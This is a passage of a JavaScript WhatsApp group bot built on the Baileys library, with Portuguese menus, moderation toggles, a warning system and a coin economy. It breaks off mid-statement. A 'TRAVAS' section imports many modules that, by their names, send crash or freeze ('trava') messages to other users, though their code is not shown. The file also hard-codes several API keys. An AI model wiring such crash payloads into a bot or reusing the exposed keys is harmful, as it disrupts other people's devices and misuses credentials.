

require("./configurar")

const {
 BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
downloadContentFromMessage, 
delay,
useSingleFileAuthState, 
generateWAMessageFromContent, 
proto, 
generateWAMessageContent, 
WAProto, 
generateWAMessage, 
prepareWAMessageMedia, 
areJidsSameUser, 
getContentType, 
WAFlag 
} = require('@adiwajshing/baileys')


const zmans = require("@adiwajshing/baileys")
const uber = require('uberduck-api')
const fs = require('fs')
const yts = require('yt-search');
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const ffmpeg = require('fluent-ffmpeg');
const { Youtube } = require('ytdownloader')
const phaticusthiccy = require("@phaticusthiccy/open-apis");

const { mediafire } = require('./funções de cmd/funções/mediafire')

const {  imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./funções/exif') 

const { pornok, hentai } = require('./funções de cmd/funções/scraper')

const webp_mp4 = require("./funções de cmd/funções/webp_mp4.js");

const { validmove, setGame } = require('./funções de cmd/tictactoe');

const execute = util.promisify(require('child_process').exec)

const { pinterest } = require("./funções de cmd/funções/pinterest")

const { wallpaper } = require("./funções de cmd/funções/wallpaper")

const sotoy = JSON.parse(fs.readFileSync('./funções de cmd/funções/sotoy.json'));

const autoreact = JSON.parse(fs.readFileSync('./funções de cmd/funções/autoreact.json'))

const { palavrasANA } = require('./funções de cmd/funções/jogos.js');

const { infobemvindo } = require('./funções de cmd/funções/infobv.js');

const welcome_group2 = JSON.parse(fs.readFileSync('./funções de cmd/grupos/welcomegp2.json'));

const welcome_group = JSON.parse(fs.readFileSync('./funções de cmd/grupos/welcomegp.json'));

const bye_group2 = JSON.parse(fs.readFileSync('./funções de cmd/grupos/byegp2.json'));

const { infopalavrao } = require('./armor/js/infopalavrao.js');

const { writeExifStc } = require('./funções/exif2')

const welkom = JSON.parse(fs.readFileSync('./funções de cmd/grupos/welkom.json'));

const { TelegraPh } = require("./funções/uploader");

const thiccysapi = require('textmaker-thiccy');

const { addComandosId, deleteComandos, getComandoBlock, getComandos, addComandos } =  require('./funções de cmd/funções/addcmd.js');

//=====================================
const xfar = require('xfarr-api');
const path = require('path')
const fetch = require('node-fetch')
const os = require('os')
 const { TiktokDownloader } = require('./funções/tiktokdl') 
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const hx = require('./funções/hxz-api')
const { TiktokDownloaderr } = require('./funções/tiktokmikudl');
const stalker = require("xzons-api")
const hxz = require('./funções/hxz-api')
const { Aki } = require('aki-api')
const { insert, response } = require('./funções de cmd/funções/simi.js');

//=====================================
const welkom2 = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/vacilo.json'));

const { detikNews } = require('./funções/detik')
const { color, bgcolor } = require('./funções/color')
const { convertSticker } = require("./funções de cmd/funções/swm.js");
const tamat = JSON.parse(fs.readFileSync('./funções de cmd/funções/tamat.json'))

const countMessage = JSON.parse(fs.readFileSync('./funções de cmd/grupos/countmsg.json'));

const { conselhob } = require('./funções de cmd/funções/conselhob.js');

const { palavras } = require('./funções de cmd/funções/conselhos.js');

const { mediafireDl } = require('./funções/mediafire')

const { cantadas } = require('./funções de cmd/funções/cantadas.js');

const { eununca } = require('./funções de cmd/funções/eununca.js');
//=====================================

const adeuscara = JSON.parse(fs.readFileSync('./funções de cmd/grupos/adeuscara.json'));

const botoff = JSON.parse(fs.readFileSync('./datab/grupos/botoff.json'));

const { menu } = require("./funções de cmd/menu/menu.js")

const { menuanime } = require("./funções de cmd/menu/menuanime.js")

const { menupuxadas } = require("./funções de cmd/menu/menupuxadas")

const { menudestrava } = require("./funções de cmd/menu/menudestrava")

const { menubrincadeiras2 } = require("./funções de cmd/menu/menubrincadeiras2")

const { menuadm } = require("./funções de cmd/menu/menuadm")

const { menupremium } = require("./funções de cmd/menu/menupremium")

const { menudesban } = require("./funções de cmd/menu/menudesban")

const { menupack } = require("./funções de cmd/menu/menupack")

const { menugerar } = require("./funções de cmd/menu/menugerar")

const { menugeradores } = require("./funções de cmd/menu/menugeradores")

const { menutravas } = require("./funções de cmd/menu/menutravas")

const { menusemprefixo } = require("./funções de cmd/menu/menusemprefixo")

const { menugrupo } = require("./funções de cmd/menu/menugrupo")

const { menuimitacoes } = require("./funções de cmd/menu/menuimitacoes")

const { menuefeito } = require("./funções de cmd/menu/menuefeito")

const { menupesquisa } = require("./funções de cmd/menu/menupesquisa")

const { menubrincadeiras } = require("./funções de cmd/menu/menubrincadeiras")

const { menumusica } = require("./funções de cmd/menu/menumusica")

const { menuedits2 } = require("./funções de cmd/menu/menuedits2")

const { menuplaquinhas } = require("./funções de cmd/menu/menuplaquinhas")

const { menulogos } = require("./funções de cmd/menu/menulogos")

const { infodono } = require("./funções de cmd/menu/infodono")

const { menudono } = require("./funções de cmd/menu/menudono")

const { menufig } = require("./funções de cmd/menu/menufig")

const { alteradores } = require("./funções de cmd/menu/alteradores")

const { menujogos } = require("./funções de cmd/menu/menujogos")

//=====================================

const { EmojiAPI } = require("emoji-api")
const imgbbUploader = require('imgbb-uploader')
const { isLimit,  getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require('./funções/limit.js');
const emoji = new EmojiAPI()
const usedCommandRecently = new Set()
const { getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, smsg, tanggal, getExtension, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getGroupAdmins,  getRandom } = require('./funções/myfunc')
const { aiovideodl } = require('./funções/scraper.js')
const cheerio = require ("cheerio");
const textpro = require('./funções/textpro')
const mimetype = require('mime-types')
const { segunPRONTOws } = require('./funções/segundo')
const { wikiSearch } = require('./funções/wiki.js');
const premium = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/premium.json'));
const { upload, nit } = require('./funções de cmd/funções/tourl');

const { forwarding, imgnazista, imggay, imgcorno, imggostosa, imggostoso, imgfeio, imgvesgo, imgbebado, imggado, matarcmd, beijocmd, chutecmd, tapacmd } = require("./funções de cmd/nescessario.json")

//=====================================

const ms = require('ms')
 let { covid } = require('./funções/covid.js') 
const { yta,  ytv, searchResult  } = require('./funções/ytdl')

const advertencia = JSON.parse(fs.readFileSync('./advertencia.json'))

const toMs = require("ms")

const adv2 = JSON.parse(fs.readFileSync('./media/user/adv2.json'));

const request = require('request');

 const participantess = (groupId, membros1) => {
            array = []
            for (let i = 0; i < membros1.length; i++) {
                array.push(membros1[i].id)
            }
            return array
        }

//===========TRAVAS=============\\

const { travavideo } = require('./src/travavideo.js');
const { porra } = require('./src/porra')
const { lugia } = require('./src/lugia')
const { txt } = require ('./src/txt.js')
const { funeral } = require('./src/funeral')
const { murian } = require('./src/murian')
const { pv3 } = require('./src/pv3')
 const { loc } = require('./src/loc')
 const { judeu } = require('./src/judeu')
 const { explosion } = require('./src/explosion')
 const { jamaicano } = require('./src/jamaicano')
 const { listbug } = require('./src/listbug.js');
 const { malvadinha } = require('./src/malvadinha')
 const { spanking } = require('./src/spanking')
 const { cova } = require('./src/cova')
 const { killed } = require('./src/killed')
 const { sumiu } = require('./src/sumiu')
 const { carrinho } = require('./src/carrinho')
 const { carrinhodesc } = require('./src/carrinhodesc')
 const { carrinhofake } = require('./src/carrinhofake')
 const { catalogo } = require('./src/catalogo')
 const { catalogodesc } = require('./src/catalogodesc')
 const { convite } = require('./src/convite')
 const { doc } = require('./src/doc')
 const { pdf } = require('./src/pdf')
 const { pdfkill } = require('./src/pdfkill')
 const { telapreta } = require('./src/telapreta')
 const { pdff } = require('./src/pdff')
 const { ngazap } = require('./src/ngazap')
 const { buttonkal } = require('./src/travas/buttonkal.js')
 const { azrarel } = require('./src/travas/azrarel.js')
 const { home } = require('./src/travas/home.js')
 const { travaloc } = require('./src/travas/travaloc.js')
//=============FIM================\\
 
//=============DESTRAVAS==============\\
const { destrava } = require('./src/destrava')
const { destrava2 } = require('./src/destrava2')
const { destrava3 } = require('./src/destrava3')
const { destrava4 } = require('./src/destrava4')
const { destrava5 } = require('./src/destrava5')
const { destrava6 } = require('./src/destrava6')
const { destrava7 } = require('./src/destrava7')
const { destrava8 } = require('./src/destrava8')
const { destrava9 } = require('./src/destrava9')
const { destrava10 } = require('./src/destrava10')
const { destrava11 } = require('./src/destrava11')
const { destrava12 } = require('./src/destrava12')
const { destrava13 } = require('./src/destrava13')
//===============FIM================\\
 
 const reSize = async(buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}

const Jimp = require('jimp')
 
const forca = JSON.parse(fs.readFileSync('./funções/database/forca.json'))
const puppet = JSON.parse(fs.readFileSync('./funções/database/puppet_forca.json'))
const anotar = JSON.parse(fs.readFileSync('./func/tabela/anotar.json'))

const disney = JSON.parse(fs.readFileSync('./datab/disney.json'));
const hbo = JSON.parse(fs.readFileSync('./datab/hbo.json'));
const star = JSON.parse(fs.readFileSync('./datab/star.json'));
const deezer = JSON.parse(fs.readFileSync('./datab/deezer.json'));
const antiview = JSON.parse(fs.readFileSync('./funções de cmd/antis/antiview.json'));
const palavra = JSON.parse(fs.readFileSync('./datab/grupos/palavras.json'))
const palavrao = JSON.parse(fs.readFileSync('./datab/grupos/palavrao.json'))
const muted = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/muted.json'))
const pro = JSON.parse(fs.readFileSync('./funções de cmd/jogos/pro.json'))
//===================================== 

const speedB = moment.tz('America/Sao_Paulo').format('ss')

//===================================== 
 
sph = "🦅" 
fake = "Lorde 𝙗𝙤𝙩 𝙈𝘿"


lolkey = global.lolhuman

keyapi = "key-da-daniela-totosa"
keyayu = "2q5H4LDAWw"
keysabrina = "dnselo"
keyapi2 = "saladakk"
keydop7 = "6bb2f5-22a158-0441f9-6b4308-115f0f"
keyale = "key_do-daniel-expr-ocl_2.0"
//===================================== 
 
var prefix = global.prefix 

NomeDoBot = global.NomeDoBot

numerodn = global.numerodonoa  

NickDono = global.NickDono

banChats = global.banChats 

banChatss = global.banChatss

logo = global.log0

logo2 = global.log2
//===================================== 
 
let picaks = ['flamejante','flaming','flarun','flasmurf']
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//========CONST=============\\

const nsfw = JSON.parse(fs.readFileSync('./funções de cmd/grupos/nsfw.json'));

const ban = JSON.parse(fs.readFileSync('./datab/usuarios/banned.json'));

const samih = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/simi.json'));

const samih2 = JSON.parse(fs.readFileSync('./funções de cmd/funções/simi.json'));

const akinator = JSON.parse(fs.readFileSync('./funções de cmd/funções/akinator.json'))

let limit = JSON.parse(fs.readFileSync('./funções de cmd/jogos/limit.json'));

let leveling = JSON.parse(fs.readFileSync('./funções de cmd/funções/leveling.json'))

const bancht = JSON.parse(fs.readFileSync('./datab/grupos/banchat.json'));

let autosticker = JSON.parse(fs.readFileSync('./funções de cmd/funções/autosticker.json'));

const autostick = JSON.parse(fs.readFileSync('./funções de cmd/funções/autostickpc.json'))

let _level = JSON.parse(fs.readFileSync('./funções de cmd/funções/level.json'))

const joguinhodavelhajs = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/joguinhodavelha.json'));

const joguinhodavelhajs2 = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/joguinhodavelha2.json'));

//========CONST BANCO=============

const dinheiro = JSON.parse(fs.readFileSync('./funções de cmd/bancos/dinheiro.json'))

const mensagem = JSON.parse(fs.readFileSync('./funções de cmd/funções/menssagem.json'))

//========COMEÇO ANTIS=============\\

const limitefll = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/flood.json'));

const anticall = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/anticall.json'));

const antifake = JSON.parse(fs.readFileSync('./funções de cmd/antis/antifake.json'))

const antilinkhard = JSON.parse(fs.readFileSync('./funções de cmd/antis/antilinkhard.json'))

const autofigu = JSON.parse(fs.readFileSync('./funções de cmd/grupos/autofigu.json'))

const antilinkgp = JSON.parse(fs.readFileSync('./funções de cmd/antis/antilinkgp.json'))

const antiporn = JSON.parse(fs.readFileSync('./funções de cmd/antis/antiporn.json'))

const antiimg = JSON.parse(fs.readFileSync('./funções de cmd/antis/antiimg.json'))

const antiflood = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/antiflood.json'));

const antisticker = JSON.parse(fs.readFileSync('./funções de cmd/antis/antisticker.json'))

const antinotas = JSON.parse(fs.readFileSync('./funções de cmd/antis/antinotas.json'))

const antictt = JSON.parse(fs.readFileSync('./funções de cmd/antis/antictt.json'))

const anticatalogo = JSON.parse(fs.readFileSync('./funções de cmd/antis/anticatalogo.json'))

const antidoc = JSON.parse(fs.readFileSync('./funções de cmd/antis/antidoc.json'))

const antiloc = JSON.parse(fs.readFileSync('./funções de cmd/antis/antiloc.json'))

const antipv = JSON.parse(fs.readFileSync('./funções de cmd/usuarios/antipv.json'))

const antivid = JSON.parse(fs.readFileSync('./funções de cmd/antis/antivideo.json'))

const antiaudio = JSON.parse(fs.readFileSync('./funções de cmd/antis/antiaudio.json'))

const game = JSON.parse(fs.readFileSync('./funções de cmd/funções/game.json'))

//========COMEÇO=============\\



module.exports = nezuko = async (nezuko, m, messages, store) => {
try {
const info = messages ? messages[0]: messages[1]
if (!info.message) return 
if (info.key && info.key.remoteJid == 'status@broadcast') return

const altpdf = Object.keys(info.message)
const type = Object.keys(info.message)[0] == 'senderKeyDistributionMessage' ? Object.keys(info.message)[2] : (Object.keys(info.message)[0] == 'messageContextInfo') ? Object.keys(info.message)[1] : Object.keys(info.message)[0]

//==============(BODY)================\\
  var body = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? info.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? info.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? info.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (info.message.buttonsResponseMessage?.selectedButtonId || info.message.listResponseMessage?.singleSelectReply.selectedRowId || info.text) : ''
 
//======================================\\
  
const args = body.trim().split(/ +/).slice(1)

const q = args.join(' ')

const texto = args.join(" ")

var isCmd = body.startsWith(prefix)  

const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null

//================(BADY)================\\
 
bady = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (info.message.listResponseMessage && info.message.listResponseMessage.singleSelectReply.selectedRowId) ? info.message.listResponseMessage.singleSelectReply.selectedRowId: ''

//======================================\\
bidy =  bady.toLowerCase()

//=======CONST DO JOGO QUANDO========\\
const arrayQND = ['Hoje', 'Amanhã', 'Nunca', 'dia', 'semana', 'mês', 'ano']

const arrayQND2 = ['dias', 'semanas', 'meses', 'anos']
//================FIM===================\\

//===============(BUDY)=================\\

budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''

var budy2 = budy.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

//======================================\\

var pes = (type === 'conversation' && m.message.conversation) ? m.message.conversation : (type == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (type == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (type == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : ''

//===========(ID DAS FIGUS)===========\\

const figura = Object.keys(m.message)[0] == "stickerMessage" ? m.message.stickerMessage.fileSha256.toString('base64') : ""

//=====================================\\

const listmsg = (from, title, desc, list) => { 
po = nezuko.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Escolha aqui","footerText": "Selecione","listType": 1,"sections": list}}, {})
return nezuko.relayWAMessage(po, {waitForAck: true})
}
listmes = (type == 'listResponseMessage') ? info.message.listResponseMessage.title : ''

//========FORMAÇÕES/CONST)============\\
const nescessario = JSON.parse(fs.readFileSync('./dono/nescessario.json'))

const numerodonos = [`${numerodn}@s.whatsapp.net`, `${nescessario.dono2}@s.whatsapp.net`, `${nescessario.dono3}@s.whatsapp.net`, `${nescessario.dono4}@s.whatsapp.net`, `${nescessario.dono5}@s.whatsapp.net`, `${nescessario.dono6}@s.whatsapp.net`, `${nescessario.dono7}@s.whatsapp.net`]

const isBot = m.key.fromMe ? true : false

const donooriginal = [`${numerodn}@s.whatsapp.net`]

const isDonoori = donooriginal.includes(m.sender) || isBot

const SoDono = numerodonos.includes(m.sender) || isBot


const botNumber = nezuko.user.id.split(':')[0]+'@s.whatsapp.net'

const itsMe = m.sender == botNumber ? true : false

const text = args.join(" ")

const from = m.key.remoteJid

const isGroup = from.endsWith('@g.us')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''

//começo do dinheiro
// ADICIONA UMA QUANTIA DE DINHEIRO NA CONTA DO USUÁRIO
           const addATM = (sender) => {
          const obj = {id: sender, dinheiro : 0}
            dinheiro.push(obj)
            fs.writeFileSync('./funções de cmd/bancos/dinheiro.json', JSON.stringify(dinheiro))
        }
// SISTEMA PARA ADICIONAR/RETIRAR O DINHEIRO DO USUÁRIO
     
            const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(dinheiro).forEach((i) => {
                if (dinheiro[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                dinheiro[position].dinheiro += amount
                fs.writeFileSync('./funções de cmd/bancos/dinheiro.json', JSON.stringify(dinheiro))
            }
        }

//CHECAR O DINHEIRO 
        const checkATMuser = (sender) => {
          let position = false
            Object.keys(dinheiro).forEach((i) => {
                if (dinheiro[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return dinheiro[position].dinheiro
            }
        }
  

//========GRUPOS/CONST)=============\\

const groupMetadata = isGroup ? await nezuko.groupMetadata(from) : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupName = isGroup ? groupMetadata.subject : ''
const sender = isGroup ? m.key.participant : m.key.remoteJid
const pushname = m.pushName ? m.pushName : ''

const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()

const arg = body.substring(body.indexOf(' ') + 1)


const argss = body.split(/ +/g)
const testat = body
const ants = body

const groupDesc = isGroup ? groupMetadata.desc : ''

const groupMembers = isGroup ? groupMetadata.participants : ''

const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

//=======================================\\



const numerodono = [ ...global.numerodonoa].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

//=============================\\

//============(SORTEIO-CONST)============\\

const isSimi = isGroup ? samih.includes(from) : false

const isSimi2 = isGroup ? samih2.includes(from) : false

const isnit = nit.includes(sender)

isGamePro = pro.includes(sender)
//=======(ADMS/DONO/ETC..CONST)========\\

const isNsfw =  isGroup ? nsfw.includes(from) : true

const isPremium = premium.includes(sender)

const isBotAdmins = groupAdmins.includes(botNumber) || false

const isGroupAdmins = groupAdmins.includes(sender) || false 

const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

//==============================

const welcm = isGroup ? wlcm.includes(from) : true
const GcRvk = isGroup ? gcrevoke.includes(from) : false
const isLevelingOn = isGroup ? leveling.includes(from) : false
const isAutoStick = autostick.includes(from)
const isAutoSticker = isGroup ? autosticker.includes(from) : false
const adeuscara = JSON.parse(fs.readFileSync('./funções de cmd/grupos/adeus.json'));
const welkom = JSON.parse(fs.readFileSync('./funções de cmd/grupos/bemvindo.json'));
const isWelkom = isGroup ? welkom.includes(from) : false
const isAdeusCara = isGroup ? adeuscara.includes(from) : false

const content = JSON.stringify(m.message)

//================COMEÇO DOS ANTIS======================\\

/********** ENVIAR BOTÃO **********/
  const enviarbuton = (from, text, footer, buttons) => {
            return nezuko.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
        }
        

//===========(ANTIS-PROTEÇÕES)===========\\

const isAntifake = isGroup ? antifake.includes(from) : false

const isAntiCtt = isGroup ? antictt.includes(from) : false

const isAnticatalogo = isGroup ? anticatalogo.includes(from) : false

const isAntiFlood = isGroup ? antiflood.includes(from) : false	

const isAntiLinkHard = isGroup ? antilinkhard.includes(from) : false

const isJoguin = isGroup ? joguinhodavelhajs.includes(sender) : false

const isAntilinkgp = isGroup ? antilinkgp.includes(from) : false

const isAntiPorn = isGroup ? antiporn.includes(from) : false

const isPalavrao = isGroup ? palavrao.includes(from) : false

const isAntiAudio = isGroup ? antiaudio.includes(from) : false	

const isBanchat = isGroup ? bancht.includes(from) : false
	
const isAntiImg = isGroup ? antiimg.includes(from) : false

const isAntiSticker = isGroup ? antisticker.includes(from) : false

const isAntiNotas = isGroup ? antinotas.includes(from) : false

const Antidoc = isGroup ? antidoc.includes(from) : false

const Antiloc = isGroup ? antiloc.includes(from) : false

const isAntiVid = isGroup ? antivid.includes(from) : false	

const isAutoReact = isGroup ? autoreact.includes(from) : false

const isAntiview = isGroup ? antiview.includes(from) : false

const isWelkom2 = isGroup ? welkom2.includes(from) : true

const bemvindojson = JSON.parse(fs.readFileSync('./funções de cmd/grupos/bvmsg.json'));
const groupoid = []
        for (let obj of bemvindojson) {
            groupoid.push(obj.id)
        }

        if (isGroup && !JSON.stringify(bemvindojson).includes(from)) {
        
            bemvindojson.push({
                id: from,
                mensagembv: 'Bem Vindo!'
            })
            fs.writeFileSync('./funções de cmd/grupos/bvmsg.json', JSON.stringify(bemvindojson, null, 2) + '\n')
        }

const groupIdWelcomed2 = []	

for(let obj of welcome_group2) groupIdWelcomed2.push(obj.id)

const groupIdBye2 = []

for(let obj of bye_group2) groupIdBye2.push(obj.id)


const isWelcomed2 = (groupIdWelcomed2.indexOf(from) >= 0) ? true : false

const isByed2 = (groupIdBye2.indexOf(from) >= 0) ? true : false	

const isGame = isGroup ? game.includes(from) : false
	
/////_FUNÇÕES ADVERTÊNCIAS_\\\\\
const addAdvertirId = (userId, from) => {
const obj = {
grupo: from, pessoa: userId, advertencias: 0
}
advertencia.push(obj)
fs.writeFileSync('./advertencia.json', JSON.stringify(advertencia, null, 2) + '\n')
}
const addAdvertir = (userId, from, quanto) => {
let position = false; Object.keys(advertencia).forEach((i) => {
if (advertencia[i].pessoa === userId && advertencia[i].grupo === from ){ position = i }})
if (position !== false) {
advertencia[position].advertencias += quanto
fs.writeFileSync('./advertencia.json', JSON.stringify(advertencia, null, 2) + '\n')
}}
const getAdvertencia = (userId, from) => {
let position = false; Object.keys(advertencia).forEach((i) => {
if (advertencia[i].pessoa === userId && advertencia[i].grupo === from) { position = i }})
if (position !== false) { return advertencia[position].advertencias }
}

//////_ADD PESSOAS ADVERTENCIA_\\\\\
if (isGroup && !info.key.fromMe){
  advertir = getAdvertencia(sender, from)
  if (advertir == undefined)addAdvertirId(sender, from)
}

const isAntiPv = (antipv.indexOf('Ativado') >= 0) ? true : false	

const isAnticall = (anticall.indexOf('Ativado') >= 0) ? true : false

const isViewOnce = (type == 'viewOnceMessage')


    //COMFIRMAR ATM 
            const confirmATM = (sender, amount) => {
          let position = false
            Object.keys(dinheiro).forEach((i) => {
                if (dinheiro[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                dinheiro[position].dinheiro -= amount
                fs.writeFileSync('./funções de cmd/bancos/dinheiro.json', JSON.stringify(dinheiro))
            }
        }                 
        

         //BALANCEAMENTO DA MOEDA/DINHERO DO BOT       
              
             const checkATM = checkATMuser(sender)
             try {
                 if (checkATM === undefined) addATM(sender)
                 const dinheirosaku = Math.floor(Math.random() * 1) + 2//GANHA ENTRA 10 * 50 POR CADA MSG
                  addKoinUser(sender, dinheirosaku)
              } catch (err) {
                 console.error(err)
             }
//=======================================\\
 const addadvid2 = (chatId) => { const obj = { groupId : chatId, users:[]}; adv2.push(obj); fs.writeFileSync('./media/user/adv2.json', JSON.stringify(adv2, null, 2))};
const getadv2 = (chatId) => { let position = false; Object.keys(adv2).forEach((i) => { if (adv2[i].groupId === chatId) { position = i }}); if (position !== false) { return adv2[position].groupId }}
const addadv2 = (chatId, oq) => { let position = false;Object.keys(adv2).forEach((i) => { if (adv2[i].groupId === chatId ){ position = i }}); if (position !== false) { adv2[position].users.push(oq); fs.writeFileSync('./media/user/adv2.json', JSON.stringify(adv2, null, 2))}}
const deleteadv2 = (chatId, oq) => { let position = false; Object.keys(adv2).forEach((i) => { if (adv2[i].groupId === chatId ){ position = i }}); if (position !== false) { adv2[position].users.splice(adv2[position].users.map(i => i.userId).indexOf(oq), 1); fs.writeFileSync('./media/user/adv2.json', JSON.stringify(adv2, null, 2))}}
const getadvBlock2 = (chatId) => { let position = false; Object.keys(adv2).forEach((i) => { if (adv2[i].groupId === chatId) { position = i }}); if (position !== false) { return adv2[position].users}}
const checkuserblock2 = (chatId, oq) => { let position = false; Object.keys(adv2).forEach((i) => { if (adv2[i].groupId === chatId) { position = i }}); if (position !== false) {
if(adv2[position].users.length > 0){
if(Date.now() >= adv2[position].users[adv2[position].users.map(i => i.userId).indexOf(oq)].expired){
adv2[position].users.splice(adv2[position].users.map(i => i.userId).indexOf(oq), 1)
fs.writeFileSync('./media/user/adv2.json', JSON.stringify(adv2, null, 2))
}}}}

if(isGroup){ checar = getadv2(from); if(checar === undefined) addadvid2(from) }
if(isGroup && isCmd && getadvBlock2(from).map(i => i.userId).includes(sender))checkuserblock2(from, sender)
if(isGroup && isCmd && getadvBlock2(from).map(i => i.userId).includes(sender)){ 
k = `╭───「 ❔ Suporte 🤓 」\n│\n├ Olá *${pushname}*\n├ Você está\n├ bloqueado no momento\n│\n╰───────────────────`
return reply(k)}

//=========(isQuoted/consts)=============\\
const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"

const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')

const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')

const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')

const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')

const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')

const isQuotedProduct = type === 'extendedTextMessage' && content.includes('productMessage')
             
//==========================================\\

selectedButton = (type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : ''

//==========================================\\


  const argsButton = selectedButton.trim().split(/ +/)

//==========================================\\

const getFileBuffer = async (mediakey, MediaType) => {
  
const stream = await downloadContentFromMessage(mediakey, MediaType)

let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

 try {
ppimg = await nezuko.profilePictureUrl(sender)
 } catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 }
const userppbuff = await getBuffer(ppimg) 


const sendSticker = (from, filename, m) => {
nezuko.sendMessage(from, {sticker: filename}, {quoted: dnselo})
}

const sendImage = (ytb) => {
nezuko.sendMessage(from, {image: ytb}, {quoted:m})
}


const sendMess = (hehe, ytb) => {
nezuko.sendMessage(hehe, {text: ytb})
}

	const pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		}
		
const mention = (teks= '', ms = info) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
nezuko.sendMessage(from, {text: teks.trim(), mentions: memberr}, {quoted: ms}) 
}		

const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? nezuko.sendMessage(from, {text: teks.trim(), mentions: memberr}) : nezuko.sendMessage(from, {text: teks.trim(), mentions: memberr})
}
	
const costum = (pesan, tipe, target, target2) => {
nezuko.sendMessage(from, pesan, tipe, {quoted: {key: {fromMe: false, participant: `${target}`, ...(from ? {remoteJid: from}: {})}, message: {conversation: `${target2}` }}})
}

const sendlistA = async (id, txt1, txt2, title1, btext, but) => {

const sections = but

const listMessage = {
text: txt1,
footer: txt2,
title: title1,
buttonText: btext,
sections
}
nezuko.sendMessage(id, listMessage)  
}


//=========HORAS=============

function kyun(seconds){
function pad(s){
return (s < 10 ? '0' : '') + s;
}
var hours = Math.floor(seconds / (60*60));
var minutes = Math.floor(seconds % (60*60) / 60);
var seconds = Math.floor(seconds % 60);
return `${pad(hours)} HORAS ${pad(minutes)} MINUTOS ${pad(seconds)} SEGUNDOS`
}



const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(time2 > "00:00:00"){
var tempo = 'Boa madrugada'
} 
if(time2 > "05:30:00"){
var tempo = 'Bom dia'
}
if(time2 > "12:00:00"){
